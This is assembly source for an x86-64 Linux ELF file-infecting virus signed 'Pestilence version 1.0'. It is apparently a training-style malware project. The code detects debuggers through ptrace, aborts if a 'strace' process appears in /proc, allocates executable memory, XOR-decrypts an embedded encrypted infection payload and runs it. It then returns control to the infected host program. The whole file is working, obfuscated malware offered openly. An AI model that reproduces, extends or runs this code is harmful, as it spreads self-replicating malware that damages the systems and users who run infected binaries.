%define DIR_FD_OFFSET       8
%define DIRENT_BUF_OFFSET   (DIR_FD_OFFSET + 4096)
%define PATH_OFFSET         (DIRENT_BUF_OFFSET + 4096)
%define FILE_FD_OFFSET      (PATH_OFFSET + 8)
%define COMM_BUFF_OFFSET    (FILE_FD_OFFSET + 5)
%define STRUCT_SIZE         (COMM_BUFF_OFFSET)


%define VIRUS_SIZE          (_end - _start)
%define BUFF_SIZE           4096

%define SYS_EXIT            60
%define SYS_OPEN            2
%define SYS_READ            0
%define SYS_GETDENTS        78
%define SYS_MMAP            9
%define SYS_FSTAT           5
%define SYS_MUNMAP          11
%define SYS_CLOSE           3
%define SYS_PTRACE          101
%define DT_DIR              4
%define DT_REG              8

struc vars
    dir_fd:         resq 1
    dirent_buf:     resb 4096
    path:           resb 4096
    file_fd:        resq 1
    comm_buff:      resb 5
endstruc

section .text
global _start

_exit:
    mov     rax, SYS_EXIT
    xor     rdi, rdi                    ; exit code 0
    syscall

_start:
    push    rbp
    mov     rbp, rsp
    sub     rbp, STRUCT_SIZE
    ; saving registers in the stack (holding argc,argv,env...)
    push	rsi
    push	rdx
    push	rcx
    push	rdi

    lea     rax, [rel _start]
    mov     rcx, [rel original_entry_off]
    sub     rax, rcx
    push    rax

    call   _is_being_debugged
    test     rax, rax
    jnz      .quit

    lea     rdi, [rel proc_dir]
    call    _check_active_process
    cmp     rax, 1
    je      .quit

.mmap_executable:
    ; mmap parameters
    mov     rdi, 0                ; addr = NULL (kernel choose the address)
    mov     rsi, 4096             ; length = 4096 bytes
    mov     rdx, 0x7              ; prot = PROT_READ | PROT_WRITE | PROT_EXEC
    mov     r10, 0x22             ; flags = MAP_PRIVATE | MAP_ANONYMOUS
    mov     r8,  -1               ; fd = -1 (no file descriptor)
    mov     r9,  0                ; offset = 0
    mov     rax, SYS_MMAP         ; sys_mmap syscall number
    syscall

    ; checking if mmap failed
    test     rax, rax            ; -1 (unsigned comparison)
    js      .quit

    ; saving mmap address
    mov     rdi, rax              ; rdi = mmap address
    push    rax
    lea     rsi, [rel infection_code]   ; rsi = source address
    lea     rbx, [rel key]
    mov     r10, 8
    mov     r11, 0
    lea     r12, [rel _decrypt_loop]
    call    _decrypt_loop

    ;preparing to call infection routine
.load_infection_routine:
    lea     rdi ,[rel _start]
    lea     rsi ,[rel _end]
    lea     rdx, [rel original_entry_off]
    lea     rcx, [rel _decrypt_loop]
    lea     r8,  [rel infection_code]
    lea     r10, [rel signature]
    lea     rbx, [rel key]
    pop     rax
    call    rax
    jmp     .quit

.quit:
    ; restoring registers. Jumping to original entry
    pop		rax
    pop		rdi
    pop		rcx
    pop		rdx
    pop		rsi
    pop		rbp
    jmp		rax

_is_being_debugged:
    ; ptrace(PTRACE_TRACEME, 0, 0, 0)
    mov     rax, SYS_PTRACE             ; ptrace syscall number
    mov     rdi, 0                      ; PTRACE_TRACEME
    xor     rsi, rsi
    xor     rdx, rdx
    xor     r10, r10
    syscall
    ret

_check_active_process:
; open the directory 
    mov     rax, SYS_OPEN
    mov     r15, rdi                    ; saving directory name pointer to use in _parse_directories
    xor     rsi, rsi                    ; O_RDONLY
    syscall
    test    rax, rax
    js      .return_parsing
    mov     [rbp - DIR_FD_OFFSET], rax

; read directory entries (getdents)
.read_proc_dir:
    mov     rax,  SYS_GETDENTS
    lea     rdi, [rbp - DIR_FD_OFFSET]
    mov     rdi, [rdi]
    lea     rsi, [rbp - DIRENT_BUF_OFFSET]
    mov     rdx,  BUFF_SIZE
    syscall
    test    rax, rax
    jle     .close_dir

    mov     r12, rax
    xor     r13, r13

.read_proc_entries:
    cmp     r12, r13
    jle     .read_proc_dir
    xor     r10, r10
    lea     rdi, [rbp - DIRENT_BUF_OFFSET]
    add     rdi, r13
    movzx	r10, word [rdi + 16]        ; d_reclen
    xor     rax, rax
   	mov	    al,  byte [rdi + r10 - 1]   ; file type
    lea     rsi, [rdi  + 18]            ; address of d_name field
    add     r13, r10
    cmp     al,  DT_DIR
    jne     .read_proc_entries
    push    r15
    jmp    _parse_directories

.loop_read_entry_files:
    xor     r15, r15
    pop     r15
    jmp     .read_proc_entries

.close_dir:
    mov     rdi, [rbp - DIR_FD_OFFSET]
    mov     rax, SYS_CLOSE
    syscall

.return_parsing:
    mov    rax, 0
    ret

_parse_directories:
; rsi has file name
    mov     rdi, r15
    lea     rdx, [rbp - PATH_OFFSET]

; concating filename with directory name
.dirname:
    mov     al, byte [rdi]
    test    al, al
    jz      .filename
    mov     byte [rdx], al
    inc     rdi
    inc     rdx
    jmp     .dirname
    
.filename:
    mov     al, byte [rsi]
    test    al, al
    jz      .find_process_name
    mov     byte [rdx], al
    inc     rsi
    inc     rdx
    jmp     .dirname

.find_process_name:
    lea    rsi, [rel comm_file]

.concat_comm:
    mov     al, byte [rsi]
    test    al, al
    jz      .open_comm_file
    mov     byte [rdx], al
    inc     rsi
    inc     rdx
    jmp     .concat_comm

.open_comm_file:
    mov     rax, SYS_OPEN
    mov     byte [rdx], 0
    lea     rdi, [rbp - PATH_OFFSET]
    mov     rsi, 0
    syscall
    test     rax, rax
    js     _check_active_process.loop_read_entry_files

.check_comm_name:
    mov     rdi, rax
    mov     [rbp - FILE_FD_OFFSET], rax
    mov     rax, SYS_READ
    lea     rsi, [rbp - COMM_BUFF_OFFSET]  
    mov     rdx, 7                      ; number of bytes to read
    syscall

    cmp     rax, 0
    jle     .close_file
    mov     byte [rsi + rax],0

    lea     rdi, [rel process_name]
    mov     rcx, 7                      ; Maximum length of process name
    repe    cmpsb
    jne     .close_file
    mov     rax, 1
    pop     r15
    ret


.close_file:
    mov     rdi, [rbp - FILE_FD_OFFSET]
    mov     rax, SYS_CLOSE
    syscall
    jmp     _check_active_process.loop_read_entry_files


_decrypt_loop:
    mov     rax, r11
    nop
    xor     rdx, rdx
    nop
    div     r10
    nop
    push    r11
    movzx   rcx, byte [rsi]
    nop
    xor     cl, byte [rbx + rdx ] ; key[i % 8)]
    mov     byte [rdi], cl
    nop
    inc     rsi
    nop
    inc     rdi
    pop     r11
    nop
    inc     r11
    cmp     r11, 0x615 
    je      .return
    jmp     r12
.return:
    ret

infection_code :db 0x7f, 0xeb, 0xe5, 0x57, 0x0a, 0xf6, 0x2c, 0x33, 0xd7, 0x9f, 0xad, 0xde, 0xa7, 0x33, 0xa8, 0xfd, 0xeb, 0xbe, 0xad, 0x96, 0x66, 0x3b, 0xad, 0x01, 0x10, 0x41, 0xe5, 0x53, 0xea, 0xf6, 0xa9, 0xde, 0xef, 0xf6, 0x24, 0x5b, 0xe7, 0x61, 0x52, 0x21, 0xa7, 0x33, 0xa8, 0xb3, 0xeb, 0xbe, 0xad, 0x96, 0x66, 0x3b, 0xbd, 0x01, 0x10, 0x41, 0xe5, 0x53, 0xea, 0x2c, 0xa9, 0xde, 0xef, 0xf6, 0x24, 0x5b, 0xf7, 0x61, 0x52, 0x21, 0xa7, 0x33, 0xa8, 0x69, 0xeb, 0xbe, 0xad, 0x96, 0x66, 0x3b, 0x8d, 0x01, 0x10, 0x41, 0xe5, 0x53, 0xea, 0x62, 0xa9, 0xde, 0xef, 0xf6, 0x24, 0x5b, 0xc7, 0x61, 0x52, 0x21, 0xa7, 0x33, 0xa8, 0xdf, 0xea, 0xbe, 0xad, 0x96, 0x66, 0x3b, 0x9d, 0x01, 0x10, 0x41, 0xe5, 0x57, 0x52, 0xee, 0x72, 0x21, 0x10, 0xf6, 0x24, 0x6b, 0xa7, 0x61, 0x52, 0x21, 0xa7, 0x37, 0x38, 0xe6, 0x30, 0x41, 0x52, 0x96, 0x66, 0x33, 0x55, 0x00, 0x10, 0x41, 0xe1, 0x57, 0x6a, 0x4e, 0x73, 0x21, 0x10, 0xf2, 0x24, 0x4b, 0x07, 0x60, 0x52, 0x21, 0xb9, 0xf6, 0x84, 0x20, 0xa7, 0x37, 0x18, 0x9e, 0x30, 0x41, 0x52, 0x80, 0xa7, 0x97, 0x73, 0x96, 0x66, 0x0b, 0x65, 0x00, 0x10, 0x41, 0xe5, 0x53, 0xd2, 0x9b, 0xa8, 0xde, 0xef, 0x56, 0xa3, 0xde, 0xef, 0xbe, 0xe5, 0x53, 0xd2, 0x9a, 0xa8, 0xde, 0xef, 0x56, 0xaf, 0xde, 0xef, 0xbe, 0xf0, 0x1d, 0xa6, 0x37, 0x52, 0x66, 0xed, 0xbe, 0xad, 0xde, 0xa7, 0x8f, 0x5b, 0xd1, 0xea, 0xf6, 0x28, 0x1e, 0x97, 0xd7, 0xe5, 0x57, 0xaa, 0x46, 0x15, 0x90, 0xef, 0xbe, 0xad, 0x96, 0x62, 0xc3, 0x55, 0x96, 0x64, 0x81, 0xe5, 0x53, 0x5a, 0x46, 0x42, 0x21, 0x10, 0x04, 0xad, 0xce, 0xef, 0xbe, 0xa2, 0xdb, 0xa7, 0x3b, 0x6d, 0xa0, 0xd4, 0xf7, 0x24, 0x1a, 0xa2, 0x8f, 0x40, 0x93, 0xd6, 0x52, 0xd3, 0x08, 0xa2, 0x8f, 0x7f, 0x96, 0x62, 0x03, 0x55, 0x31, 0x10, 0x41, 0xe1, 0xdf, 0x00, 0xf2, 0xa2, 0x69, 0xb8, 0xae, 0xef, 0x54, 0xab, 0xa9, 0x52, 0x96, 0x62, 0xc9, 0xbf, 0x93, 0xee, 0x6b, 0x91, 0xd6, 0x9a, 0x67, 0xec, 0x89, 0x07, 0xad, 0xad, 0xde, 0xef, 0xf3, 0x9c, 0x21, 0xae, 0xe1, 0x46, 0x15, 0xa7, 0x35, 0xd0, 0x26, 0x57, 0xbd, 0xad, 0xde, 0xef, 0xb1, 0xa8, 0x1d, 0xa3, 0x37, 0x52, 0x96, 0x62, 0x2b, 0x55, 0x01, 0x10, 0x41, 0x27, 0xd9, 0x6b, 0x7e, 0xd9, 0xd4, 0x67, 0xbc, 0xe5, 0x21, 0x28, 0xf6, 0x52, 0x1c, 0x04, 0x4e, 0x27, 0xd8, 0x6b, 0x7e, 0xd9, 0xd4, 0x67, 0xbc, 0xe5, 0x21, 0x29, 0xf6, 0x52, 0x1c, 0x04, 0x5e, 0x6b, 0xdc, 0xef, 0xf6, 0x20, 0x63, 0x17, 0x61, 0x52, 0x21, 0x57, 0xbc, 0xad, 0xde, 0xef, 0x00, 0xaf, 0xde, 0xef, 0xbe, 0xa2, 0xdb, 0xa7, 0x3b, 0x6d, 0xa6, 0xed, 0x55, 0xac, 0x1d, 0xa3, 0x33, 0x28, 0x2e, 0x30, 0x41, 0x52, 0x97, 0x66, 0xbe, 0xe5, 0x57, 0x28, 0xf6, 0x20, 0x6b, 0xb7, 0x61, 0x52, 0x21, 0x57, 0xbb, 0xad, 0xde, 0xef, 0xb1, 0xa8, 0x96, 0x6a, 0x7e, 0xa2, 0x56, 0x6f, 0xbe, 0xad, 0xde, 0xa7, 0x35, 0xdb, 0xee, 0xa7, 0x37, 0x18, 0x06, 0x31, 0x41, 0x52, 0x96, 0x6e, 0x78, 0xad, 0xde, 0xef, 0xb2, 0xe5, 0x57, 0x5a, 0x6e, 0x73, 0x21, 0x10, 0xf6, 0x26, 0x6b, 0x37, 0x60, 0x52, 0x21, 0x07, 0x78, 0xae, 0xde, 0xef, 0xf6, 0x28, 0x1e, 0x97, 0xe8, 0xe5, 0x53, 0x72, 0x56, 0x72, 0x21, 0x10, 0xf6, 0x24, 0xdd, 0xa7, 0x35, 0xb6, 0x96, 0x55, 0xc1, 0xe8, 0x92, 0xa9, 0xbc, 0xac, 0xdf, 0xef, 0xf6, 0x94, 0xcd, 0x9a, 0x8b, 0xe5, 0x55, 0x52, 0x56, 0x73, 0x21, 0x10, 0xf6, 0x26, 0x6b, 0xa7, 0x61, 0x52, 0x21, 0xa7, 0x97, 0x53, 0x96, 0x64, 0x3b, 0x45, 0x01, 0x10, 0x41, 0xe1, 0x55, 0x7a, 0x66, 0x73, 0x21, 0x10, 0xf7, 0x84, 0x2c, 0xa3, 0xbf, 0x7d, 0x96, 0x64, 0x81, 0xe5, 0x55, 0xef, 0xf6, 0x94, 0x19, 0x9b, 0xbb, 0x45, 0xca, 0xef, 0xbe, 0xad, 0x36, 0x7f, 0xbd, 0xad, 0xde, 0xa7, 0x35, 0x10, 0x2e, 0x30, 0x41, 0x52, 0x66, 0xec, 0xbe, 0xad, 0xde, 0xe0, 0xbb, 0x6e, 0x97, 0x66, 0x60, 0xe1, 0x55, 0xb4, 0xa6, 0xe5, 0xd1, 0x58, 0xed, 0x95, 0x96, 0x64, 0xf5, 0x8d, 0x96, 0xee, 0x75, 0x15, 0xda, 0xef, 0xbe, 0xad, 0x96, 0x6c, 0x44, 0xad, 0xd1, 0x61, 0x0f, 0xac, 0xde, 0xef, 0x84, 0xae, 0xab, 0xed, 0x55, 0xa4, 0x96, 0x10, 0x74, 0xe5, 0x5d, 0x2c, 0x86, 0x46, 0x39, 0xa2, 0x37, 0x5a, 0x92, 0x64, 0x0b, 0x45, 0x01, 0x10, 0x41, 0xe0, 0xf7, 0x18, 0xf6, 0x15, 0xdf, 0xef, 0xbe, 0xad, 0xdb, 0xef, 0xbe, 0xad, 0x96, 0x66, 0xbd, 0xe5, 0xef, 0x2f, 0xf6, 0x26, 0x5b, 0x37, 0x60, 0x52, 0x21, 0xa7, 0x37, 0xee, 0xd6, 0xa7, 0x35, 0x28, 0x0e, 0x31, 0x41, 0x52, 0x96, 0x66, 0xfd, 0xbd, 0x96, 0x28, 0xfd, 0x9d, 0xde, 0xef, 0x9e, 0xad, 0x96, 0x64, 0x3b, 0xed, 0x01, 0x10, 0x41, 0xe5, 0x57, 0xac, 0x9e, 0xe5, 0x57, 0xac, 0x96, 0x45, 0xdf, 0xec, 0xbe, 0xad, 0x96, 0x64, 0x03, 0x5d, 0x01, 0x10, 0x41, 0x15, 0x93, 0xef, 0xbe, 0xad, 0x96, 0x64, 0x0b, 0x75, 0x00, 0x10, 0x41, 0xe5, 0xdd, 0x5a, 0xfe, 0x72, 0x21, 0x10, 0xb1, 0xa8, 0x96, 0x6a, 0x7e, 0xa2, 0x56, 0xc1, 0xbf, 0xad, 0xde, 0xa7, 0x35, 0x18, 0x06, 0x31, 0x41, 0x52, 0x96, 0xec, 0x0b, 0xed, 0x01, 0x10, 0x41, 0x45, 0x7a, 0xed, 0xbe, 0xad, 0x96, 0x6a, 0x7e, 0xa2, 0x56, 0xfd, 0xbf, 0xad, 0xde, 0xa7, 0x37, 0x28, 0x36, 0x30, 0x41, 0x52, 0x96, 0x64, 0x03, 0x45, 0x01, 0x10, 0x41, 0xe5, 0xdd, 0x52, 0x66, 0x73, 0x21, 0x10, 0xf6, 0x26, 0x6b, 0xbf, 0x61, 0x52, 0x21, 0xa7, 0x35, 0x28, 0x26, 0x31, 0x41, 0x52, 0x96, 0xc6, 0x4e, 0xe4, 0x57, 0x2f, 0xf6, 0x9c, 0x1e, 0x07, 0xc4, 0xad, 0xde, 0xef, 0xb1, 0x9c, 0x67, 0xe8, 0xbe, 0xad, 0xde, 0xa7, 0x8f, 0x7f, 0x96, 0x18, 0x4f, 0xe5, 0x55, 0x5b, 0x6b, 0xad, 0x01, 0x10, 0x41, 0xec, 0x66, 0xdc, 0xbe, 0xad, 0xde, 0xa7, 0x8f, 0x6d, 0x36, 0xb8, 0xbe, 0xad, 0xde, 0xa7, 0x33, 0x20, 0x3e, 0x31, 0x41, 0x52, 0x96, 0x62, 0xa3, 0x22, 0xdc, 0xef, 0xbe, 0xe5, 0xef, 0x19, 0x56, 0x04, 0xde, 0xef, 0xbe, 0xe5, 0x53, 0x72, 0x5e, 0x73, 0x21, 0x10, 0xff, 0x17, 0xd6, 0xef, 0xbe, 0xad, 0x96, 0x62, 0x8b, 0x2f, 0x22, 0x10, 0x41, 0xe0, 0xef, 0x2f, 0x56, 0x82, 0xde, 0xef, 0xbe, 0xe5, 0x55, 0x6a, 0xf6, 0x72, 0x21, 0x10, 0xf6, 0x26, 0x6b, 0x1f, 0x60, 0x52, 0x21, 0xa7, 0x3f, 0x6b, 0xcb, 0xe9, 0xbe, 0xad, 0x96, 0xc6, 0x4e, 0xe4, 0x57, 0x2f, 0xf6, 0x9c, 0x1e, 0x07, 0xbc, 0xad, 0xde, 0xef, 0x55, 0x82, 0x7a, 0xa7, 0x41, 0x6d, 0x92, 0xd6, 0x7e, 0xd8, 0x29, 0x2c, 0xf2, 0x24, 0x1e, 0xa7, 0x8f, 0x7f, 0x97, 0x18, 0x4c, 0xe5, 0xd1, 0x59, 0xb0, 0x9f, 0xd2, 0xfc, 0x36, 0xa2, 0x96, 0x10, 0x78, 0xe5, 0x21, 0x28, 0xf7, 0x52, 0x1e, 0xa6, 0x3f, 0x55, 0xcb, 0xe9, 0xbe, 0xad, 0xab, 0x33, 0x7d, 0xe1, 0x55, 0x5a, 0x56, 0x72, 0x21, 0x10, 0xf3, 0x26, 0x80, 0xf7, 0xf6, 0x26, 0x5b, 0x3f, 0x60, 0x52, 0x21, 0xa3, 0x97, 0x75, 0x96, 0x66, 0xf9, 0x55, 0x92, 0x64, 0x3b, 0x4d, 0x00, 0x10, 0x41, 0xe5, 0x55, 0x6a, 0x76, 0x73, 0x21, 0x10, 0xf6, 0x84, 0x19, 0xa3, 0x37, 0xaa, 0x96, 0x64, 0x3b, 0x7d, 0x00, 0x10, 0x41, 0xe4, 0x57, 0xa9, 0xa6, 0x6e, 0xd1, 0xde, 0xff, 0x15, 0xfa, 0xef, 0xbe, 0xad, 0x96, 0xde, 0x6c, 0xe4, 0x29, 0x1f, 0xf6, 0x9c, 0x1e, 0x65, 0xba, 0xbe, 0x56, 0xee, 0xf6, 0x52, 0x1f, 0xa7, 0x41, 0x6b, 0x96, 0x6c, 0x40, 0xa5, 0xab, 0x31, 0x7d, 0xe1, 0x57, 0x37, 0x2e, 0xe5, 0xef, 0x3d, 0x2e, 0xe4, 0x29, 0x1d, 0x2e, 0xec, 0x8d, 0xa7, 0xb1, 0x1b, 0xd0, 0x7f, 0x8c, 0xa1, 0xcd, 0x67, 0xb1, 0x3d, 0x96, 0x10, 0x78, 0x3d, 0x96, 0x10, 0x79, 0xec, 0x85, 0x7f, 0xf7, 0x52, 0x1d, 0xa6, 0x3f, 0x56, 0xcb, 0xe9, 0xbe, 0xad, 0xaa, 0xec, 0xff, 0x52, 0x3a, 0x2c, 0xf2, 0x24, 0x06, 0xa7, 0x8f, 0x7f, 0x4e, 0xa6, 0x49, 0x5f, 0x4e, 0xa7, 0xb1, 0x1b, 0xd0, 0xdd, 0xb2, 0xbe, 0x56, 0xe0, 0xf6, 0x52, 0x18, 0x7f, 0xf6, 0x52, 0x19, 0xa6, 0x41, 0x6e, 0x96, 0xde, 0x7e, 0xe5, 0x1f, 0x07, 0xbd, 0x3d, 0x97, 0x6e, 0x45, 0xb8, 0xd8, 0xef, 0xbe, 0xd9, 0xdd, 0xae, 0x41, 0x49, 0x1d, 0xa3, 0x37, 0x75, 0x96, 0xde, 0x6c, 0xe4, 0x29, 0x1d, 0xf6, 0xa2, 0x68, 0xe1, 0x8c, 0xa1, 0xcd, 0x67, 0xb1, 0xe4, 0x57, 0x1a, 0xf7, 0x9c, 0x23, 0xa7, 0x41, 0x6b, 0x96, 0x10, 0x79, 0x3d, 0x97, 0x10, 0x7d, 0xe5, 0x1f, 0x0f, 0xbd, 0xe4, 0x5f, 0x14, 0xab, 0xab, 0xde, 0xef, 0xca, 0xae, 0x9f, 0x10, 0x5a, 0x6e, 0x92, 0x66, 0x66, 0xe5, 0xef, 0x3d, 0x2e, 0xe4, 0x29, 0x1d, 0xf6, 0xa2, 0x68, 0xe1, 0xff, 0xff, 0x9f, 0xb5, 0x8c, 0xa1, 0xcd, 0x67, 0xb1, 0xe5, 0x21, 0x29, 0xf6, 0x9c, 0x1e, 0x7f, 0xf6, 0x52, 0x19, 0xa6, 0x41, 0x6e, 0x4e, 0xa6, 0x3f, 0x56, 0xcb, 0xe9, 0xbe, 0xad, 0xaa, 0xeb, 0x2e, 0xec, 0x21, 0x0b, 0x7d, 0xe1, 0x57, 0x37, 0xf6, 0x9c, 0x0c, 0xa6, 0x49, 0x5f, 0x96, 0xe0, 0x08, 0xa3, 0xec, 0xe3, 0xad, 0x3d, 0x56, 0xe0, 0xf6, 0x6c, 0x1f, 0xeb, 0xf6, 0x6c, 0x17, 0xea, 0xf6, 0x52, 0x18, 0xa7, 0x41, 0x6a, 0x4e, 0xa6, 0x41, 0x6e, 0x4e, 0xa6, 0x3f, 0x56, 0xcb, 0xe9, 0xbe, 0xad, 0xaa, 0xec, 0xff, 0x52, 0x3a, 0x2c, 0xf2, 0x24, 0x06, 0xa7, 0x8f, 0x7f, 0x97, 0x18, 0x4c, 0xe5, 0xd1, 0x59, 0xb0, 0xe5, 0x57, 0x2f, 0x8c, 0xa1, 0xcd, 0x67, 0xb1, 0xe5, 0x21, 0x29, 0xf6, 0x52, 0x19, 0xa7, 0x7f, 0x65, 0xd8, 0xa6, 0x41, 0x6e, 0x96, 0x2e, 0x7e, 0xab, 0x97, 0x6e, 0x45, 0xb8, 0xd8, 0xef, 0xbe, 0xd9, 0xdd, 0xae, 0x41, 0x49, 0x1d, 0xa3, 0x37, 0x75, 0x4e, 0xa7, 0x8f, 0x7f, 0x97, 0x18, 0x4c, 0xe5, 0xd1, 0x59, 0xb0, 0x3d, 0xec, 0xe3, 0xad, 0xe5, 0x21, 0x2f, 0x2e, 0x25, 0xd1, 0xa7, 0x41, 0x6b, 0x96, 0x2e, 0x76, 0xaf, 0x96, 0x10, 0x79, 0xe4, 0x21, 0x2c, 0x2e, 0xe4, 0x5f, 0x14, 0xab, 0xab, 0xde, 0xef, 0xca, 0xae, 0x9f, 0x10, 0x5a, 0x6e, 0x61, 0xef, 0xbe, 0xad, 0xde, 0x55, 0xbd, 0xad, 0xde, 0xef, 0xff, 0x17, 0xdf, 0xef, 0xbe, 0xad, 0x92, 0x64, 0x3b, 0x5d, 0x01, 0x10, 0x41, 0xe0, 0xef, 0x26, 0xf6, 0x9c, 0x17, 0x57, 0xb7, 0xad, 0xde, 0xef, 0xb1, 0xa8, 0x1d, 0xa7, 0x35, 0x10, 0x36, 0x30, 0x41, 0x52, 0x96, 0x62, 0x0b, 0xf5, 0x01, 0x10, 0x41, 0xe5, 0x55, 0x99, 0xfe, 0x15, 0xd5, 0xef, 0xbe, 0xad, 0xd1, 0xea, 0x7d, 0x82, 0xaa, 0x82, 0xce, 0x82, 0xaa, 0x8a, 0xcd, 0xd9, 0xf1, 0xef, 0x91, 0xd9, 0xb3, 0x9f, 0x91, 0xd9, 0xbb, 0x9c, 0xca, 0x9f, 0xf1, 0xef, 0xdf, 0xcf, 0xbd, 0x8b, 0xdb, 0xcb, 0xb4, 0x87, 0xd7, 0xc7, 0xb5, 0x83, 0xd3, 0xc3, 0xb1, 0x9f, 0xcf, 0xdf, 0xad, 0x9b, 0xcb, 0xdb, 0xa9, 0x97, 0xc7, 0xd7, 0xee, 0xde, 0x8c, 0x9e, 0xea, 0xda, 0x88, 0x9a, 0xe6, 0xd6

proc_dir            db  "/proc/", 0
process_name        db  "strace",0xa, 0
comm_file           db  "/comm", 0
signature           db  "Pestilence version 1.0 (c)oded by <pengu>", 0
key                 dq  0xdeadbeefdeadbeef
original_entry_off	dq	0xa ; for infected binaries, the value is the offset to original entry point.

_end:
